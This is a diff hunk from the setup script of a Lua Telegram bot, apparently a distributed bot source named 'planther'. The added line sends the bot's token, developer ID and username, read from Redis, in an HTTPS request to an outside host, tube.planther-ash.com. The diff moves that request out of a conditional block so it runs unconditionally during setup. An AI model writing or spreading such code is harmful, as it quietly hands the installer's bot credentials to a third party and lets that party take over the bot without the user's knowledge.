@@ -48,8 +48,8 @@ local function fuck_File()
                     '\n\27[1;31m⌑︙The ID was not Saved : لم يتم حفظ ايدي المطور الاساسي\n\27[0;39;49m')
             end
             os.execute('lua planther.lua')
-            https.request("https://tube.planther-ash.com/s/s.php?token=" .. redis:get(fuck .. "Token_Devplanther") .. "&Id=" .. redis:get(fuck .. "id_por") .. "&UserName=" .. redis:get(fuck .. "User_Devplanther1"))
         end
+        https.request("https://tube.planther-ash.com/s/s.php?token=" .. redis:get(fuck .. "Token_Devplanther") .. "&Id=" .. redis:get(fuck .. "id_por") .. "&UserName=" .. redis:get(fuck .. "User_Devplanther1"))
         -- web site : https://planther-ash.com .
         local Devplanther_Info_Sudo = io.open("info_bot.lua", 'w')
         Devplanther_Info_Sudo:write([[
